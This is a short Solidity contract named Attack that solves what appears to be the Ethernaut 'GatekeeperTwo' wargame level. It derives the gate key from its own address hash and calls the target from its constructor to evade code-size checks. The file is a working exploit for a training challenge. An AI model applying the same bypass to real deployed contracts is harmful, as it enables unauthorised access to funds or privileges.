// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack {
    address public target;
    constructor(address _target) {
        bytes8 gatekey = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        (bool success, ) = _target.call(
            abi.encodeWithSignature("enter(bytes8)", gatekey)
        );

        GatekeeperTwo gatekeeperTwo = GatekeeperTwo(_target);
        gatekeeperTwo.enter(gatekey);
    }
}